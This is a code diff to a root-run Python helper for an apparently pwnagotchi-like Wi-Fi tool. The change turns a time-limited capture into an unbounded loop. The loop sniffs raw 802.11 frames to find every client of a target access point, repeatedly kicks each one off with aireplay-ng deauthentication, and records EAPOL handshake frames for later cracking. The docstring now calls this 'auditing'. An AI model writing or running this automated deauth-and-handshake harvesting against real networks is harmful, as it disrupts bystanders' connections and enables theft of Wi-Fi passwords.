@@ -1,5 +1,5 @@
 #!/usr/bin/python3 -I
-"""Privileged, bounded capture on a dedicated USB Wi-Fi PHY."""
+"""Privileged, targeted auditing on a dedicated USB Wi-Fi PHY."""
 
 import fcntl
 from pathlib import Path
@@ -7,6 +7,8 @@ import os
 import re
 import select
 import signal
+import socket
+import struct
 import subprocess
 import sys
 import time
@@ -68,12 +70,110 @@ def stop(process, sig):
         process.wait()
 
 
-def collect(interface, freq, bssid, client):
+def station_address(packet, bssid):
+    if len(packet) < 8 or packet[0] != 0:
+        return None
+    offset = struct.unpack_from("<H", packet, 2)[0]
+    if offset < 8 or len(packet) < offset + 24:
+        return None
+    control, direction = packet[offset:offset + 2]
+    if control & 0x0c != 8:
+        return None
+    receiver = packet[offset + 4:offset + 10]
+    sender = packet[offset + 10:offset + 16]
+    if direction & 3 == 1 and receiver == bssid:
+        station = sender
+    elif direction & 3 == 2 and sender == bssid:
+        station = receiver
+    else:
+        return None
+    if station != bssid and any(station) and not station[0] & 1:
+        return station.hex(":")
+
+
+def progress(message):
+    print("ZG STATUS " + message, file=sys.stderr, flush=True)
+
+
+def run_session(monitor, bssid, mode):
+    capture = injection = stations_socket = None
+    stations = {}
+    last_attempt = {}
+    attempts = failures = 0
+    last_report = 0.0
+    next_attempt = 0.0
+    ap = bytes.fromhex(bssid.replace(":", ""))
+    try:
+        if mode != "deauth":
+            capture = subprocess.Popen(
+                [TCPDUMP, "-i", monitor, "-s", "0", "-U", "-w", "-",
+                 f"wlan host {bssid} and (type mgt or ether proto 0x888e)"],
+                stdin=subprocess.DEVNULL,
+            )
+        if mode != "passive":
+            stations_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
+            stations_socket.bind((monitor, 0))
+            stations_socket.setblocking(False)
+        readers = [sys.stdin]
+        if stations_socket is not None:
+            readers.append(stations_socket)
+        progress("Radio ready. Listening on selected channel.")
+        while True:
+            readable, _, _ = select.select(readers, [], [], 0.2)
+            if sys.stdin in readable and not sys.stdin.buffer.read1(1):
+                break
+            if capture is not None and capture.poll() is not None:
+                raise RadioError("Capture tool exited early")
+            now = time.monotonic()
+            if stations_socket in readable:
+                for _ in range(64):
+                    try:
+                        packet = stations_socket.recv(4096)
+                    except BlockingIOError:
+                        break
+                    station = station_address(packet, ap)
+                    if station:
+                        stations[station] = now
+            if injection is not None:
+                status = injection.poll()
+                if status is None and now - injection_started >= 8:
+                    stop(injection, signal.SIGTERM)
+                    status = 1
+                if status is not None:
+                    failures += int(status != 0)
+                    injection = None
+            if stations_socket is not None and injection is None and now >= next_attempt:
+                # A client must have been seen recently on the selected BSSID.
+                eligible = (mac for mac, seen in stations.items()
+                            if now - seen <= 30 and now - last_attempt.get(mac, -60) >= 15)
+                station = min(eligible, key=lambda mac: last_attempt.get(mac, -60), default=None)
+                if station is not None:
+                    injection = subprocess.Popen(
+                        [AIREPLAY, "--deauth", "2", "-a", bssid, "-c", station, monitor],
+                        stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                    )
+                    injection_started = last_attempt[station] = now
+                    next_attempt = now + 1
+                    attempts += 1
+            if stations_socket is not None and now - last_report >= 2:
+                for mac in tuple(stations):
+                    if now - stations[mac] > 60:
+                        del stations[mac]
+                        last_attempt.pop(mac, None)
+                progress(f"Clients seen: {len(stations)}   Deauth attempts: {attempts} | Failed attempts: {failures}")
+                last_report = now
+    finally:
+        stop(injection, signal.SIGTERM)
+        stop(capture, signal.SIGINT)
+        if stations_socket is not None:
+            stations_socket.close()
+
+
+def collect(interface, freq, bssid, mode):
     phy, active_links = dedicated_phy(interface)
     monitor = f"zgmon{os.getpid()}"
     created = False
     restore_links = []
-    capture = injection = None
     try:
         for link in active_links:
             command(IP, "link", "set", "dev", link, "down")
@@ -82,28 +182,8 @@ def collect(interface, freq, bssid, client):
         created = True
         command(IP, "link", "set", "dev", monitor, "up")
         command(IW, "dev", monitor, "set", "freq", freq)
-        capture = subprocess.Popen(
-            [TCPDUMP, "-i", monitor, "-s", "0", "-U", "-w", "-",
-             f"wlan host {bssid} and (type mgt or ether proto 0x888e)"],
-            stdin=subprocess.DEVNULL,
-        )
-        start = time.monotonic()
-        while time.monotonic() - start < 25:
-            if select.select([sys.stdin], [], [], 0.2)[0] and not sys.stdin.buffer.read1(1):
-                break
-            elapsed = time.monotonic() - start
-            if capture.poll() is not None:
-                raise RadioError("Capture tool exited early")
-            if client and elapsed >= 3 and injection is None:
-                injection = subprocess.Popen(
-                    [AIREPLAY, "--deauth", "2", "-a", bssid, "-c", client, monitor],
-                    stdin=subprocess.DEVNULL, stdout=sys.stderr,
-                )
-        if injection is not None and injection.poll() != 0:
-            print("ZEROGOTCHI: Deauth failed or was interrupted", file=sys.stderr)
+        run_session(monitor, bssid, mode)
     finally:
-        stop(injection, signal.SIGTERM)
-        stop(capture, signal.SIGINT)
         try:
             if created:
                 command(IW, "dev", monitor, "del")
@@ -111,19 +191,19 @@ def collect(interface, freq, bssid, client):
             for link in restore_links:
                 command(IP, "link", "set", "dev", link, "up")
 
-
 def main(args):
-    if os.geteuid() != 0 or len(args) not in (3, 4):
+    if os.geteuid() != 0 or len(args) != 4:
         raise RadioError("Capture helper requires approved sudo access")
-    interface, freq, bssid, *station = args
-    client = station[0] if station else None
+    interface, freq, bssid, mode = args
+    if mode not in ("passive", "active", "deauth"):
+        raise RadioError("Invalid radio mode")
     if not re.fullmatch(r"[A-Za-z0-9_][A-Za-z0-9_.-]{0,14}", interface):
         raise RadioError("Invalid adapter name")
     if not re.fullmatch(r"[0-9]{4}", freq) or not 2412 <= int(freq) <= 7115:
         raise RadioError("Unsupported Wi-Fi frequency")
-    if not valid_mac(bssid) or (client and (not valid_mac(client) or client.lower() == bssid.lower())):
-        raise RadioError("Invalid AP or client MAC")
-    if client and int(freq) >= 5925:
+    if not valid_mac(bssid):
+        raise RadioError("Invalid AP MAC")
+    if mode != "passive" and int(freq) >= 5925:
         raise RadioError("Deauth is unavailable on 6 GHz")
 
     with open("/run/zerogotchi-radio.lock", "a", encoding="ascii") as lock:
@@ -131,7 +211,7 @@ def main(args):
             fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
         except BlockingIOError as error:
             raise RadioError("Another capture is running") from error
-        collect(interface, freq, bssid, client)
+        collect(interface, freq, bssid, mode)
 
 
 def interrupted(signum, frame):
